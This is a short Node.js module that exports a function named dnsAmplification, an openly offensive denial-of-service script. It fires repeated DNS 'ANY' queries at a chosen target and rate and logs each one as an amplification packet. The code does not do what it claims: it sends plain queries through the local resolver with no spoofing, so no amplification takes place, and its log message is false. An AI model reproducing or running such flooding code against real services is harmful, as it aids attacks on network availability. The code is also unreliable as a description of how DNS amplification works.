const dns = require('dns');

function dnsAmplification(target, rateLimit, logOutput) {
    setInterval(() => {
        dns.resolve(target, 'ANY', (err, addresses) => {
            if (err) {
                logOutput('Error: ' + err.message);
            } else {
                logOutput('Sent DNS amplification packet');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = dnsAmplification;
